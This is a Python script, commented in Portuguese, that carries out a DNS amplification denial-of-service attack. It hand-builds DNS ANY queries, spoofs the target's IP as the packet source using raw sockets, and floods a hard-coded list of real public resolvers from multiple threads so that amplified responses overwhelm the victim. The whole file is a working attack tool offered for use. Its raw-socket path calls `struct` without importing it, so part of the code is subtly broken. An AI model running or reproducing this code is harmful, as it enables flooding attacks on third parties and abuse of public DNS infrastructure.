#!/usr/bin/env python3
"""
DNS Amplification Attack — explora servidores DNS abertos para amplificar tráfego.
Usa queries do tipo ANY (consulta máxima amplificação) com IP spoofed.
"""

import socket
import random
import time
import threading


# Lista de DNS servers públicos abertos (resolvedores)
PUBLIC_DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4",           # Google
    "1.1.1.1", "1.0.0.1",           # Cloudflare
    "9.9.9.9", "149.112.112.112",   # Quad9
    "208.67.222.222", "208.67.220.220",  # OpenDNS
    "64.6.64.6", "64.6.65.6",       # Verisign
    "185.228.168.9", "185.228.169.9", # CleanBrowsing
    "76.76.19.19", "76.223.122.150", # Alternate DNS
    "94.140.14.14", "94.140.15.15", # AdGuard
]


def _build_dns_query(domain: bytes, query_type: int = 255) -> bytes:
    """
    Constrói uma query DNS manualmente.
    query_type: 255 = ANY (máxima amplificação)
    """
    # Header DNS
    transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
    flags = (0x0100).to_bytes(2, 'big')  # Standard query, recursion desired
    questions = (1).to_bytes(2, 'big')    # QDCOUNT: 1 pergunta
    answer_rrs = (0).to_bytes(2, 'big')   # ANCOUNT
    authority_rrs = (0).to_bytes(2, 'big') # NSCOUNT
    additional_rrs = (0).to_bytes(2, 'big') # ARCOUNT
    
    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
    
    # Question section — domain name encoded
    # Ex: google.com vira \x06google\x03com\x00
    labels = domain.split(b'.')
    question = b''
    for label in labels:
        question += bytes([len(label)]) + label
    question += b'\x00'  # Terminator
    
    # QTYPE e QCLASS
    question += query_type.to_bytes(2, 'big')  # QTYPE: ANY
    question += (1).to_bytes(2, 'big')          # QCLASS: IN
    
    return header + question


def dns_amplification(target_ip: str, target_port: int = 53, duration: int = 60,
                      stop_event: threading.Event = None, threads: int = 8,
                      dns_servers: list = None):
    """
    DNS Amplification Attack.
    
    Envia queries DNS com IP de origem spoofed (alvo) para servidores DNS abertos.
    O servidor DNS responde para o alvo com pacotes muito maiores que a query (amplificação de ~50x).
    
    Args:
        target_ip: IP do alvo (será spoofado como origem)
        target_port: Porta do alvo (geralmente 53)
        duration: Duração em segundos
        stop_event: Evento para parar
        threads: Número de threads
        dns_servers: Lista de DNS servers para usar
    """
    
    if stop_event is None:
        stop_event = threading.Event()
    
    if dns_servers is None:
        dns_servers = PUBLIC_DNS_SERVERS
    
    domains = [
        b'google.com', b'youtube.com', b'facebook.com', b'amazon.com',
        b'wikipedia.org', b'twitter.com', b'instagram.com', b'linkedin.com',
        b'reddit.com', b'github.com', b'stackoverflow.com', b'yahoo.com',
        b'bing.com', b'live.com', b'office.com', b'microsoft.com',
        b'apple.com', b'icloud.com', b'netflix.com', b'spotify.com',
        b'cloudflare.com', b'cloudflare-dns.com', b'isc.org', b'dns.google',
    ]
    
    def flood_worker(worker_id):
        try:
            # Raw socket para IP spoofing
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            using_raw = True
        except PermissionError:
            # Fallback: não consegue spoofar, mas ainda consulta DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            using_raw = False
        
        end_time = time.time() + duration
        
        while time.time() < end_time:
            if stop_event.is_set():
                break
            
            dns_server = random.choice(dns_servers)
            domain = random.choice(domains)
            query = _build_dns_query(domain, query_type=255)  # ANY query
            
            try:
                if using_raw:
                    # IP spoofing: pacote IP com origem = target_ip
                    # Monta header IP manual
                    ip_ver_ihl = (4 << 4) + 5  # IPv4, 5 words (20 bytes)
                    ip_tos = 0
                    ip_tot_len = 20 + len(query)
                    ip_id = random.randint(1, 65535)
                    ip_frag = 0
                    ip_ttl = 64
                    ip_proto = socket.IPPROTO_UDP
                    ip_src = socket.inet_aton(target_ip)  # SPOOFED!
                    ip_dst = socket.inet_aton(dns_server)
                    
                    # UDP header
                    udp_src = random.randint(1024, 65535)
                    udp_dst = 53  # DNS
                    udp_len = 8 + len(query)
                    
                    udp_header = struct.pack('!HHHH',
                        udp_src, udp_dst, udp_len, 0
                    )
                    
                    # IP header + UDP header + DNS query
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
                        ip_frag, ip_ttl, ip_proto, 0,
                        ip_src, ip_dst
                    )
                    
                    packet = ip_header + udp_header + query
                    sock.sendto(packet, (dns_server, 0))
                else:
                    # Sem spoofing: envia query normal para DNS server
                    sock.sendto(query, (dns_server, 53))
            except:
                pass
        
        sock.close()
    
    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker, args=(i,), daemon=True)
        t.start()
        workers.append(t)
    
    for t in workers:
        t.join()


if __name__ == '__main__':
    print("[*] Testando DNS amplification por 5 segundos...")
    stop = threading.Event()
    t = threading.Thread(target=dns_amplification, args=('127.0.0.1', 53, 5, stop))
    t.start()
    time.sleep(5)
    stop.set()
    print("[*] Teste finalizado.")
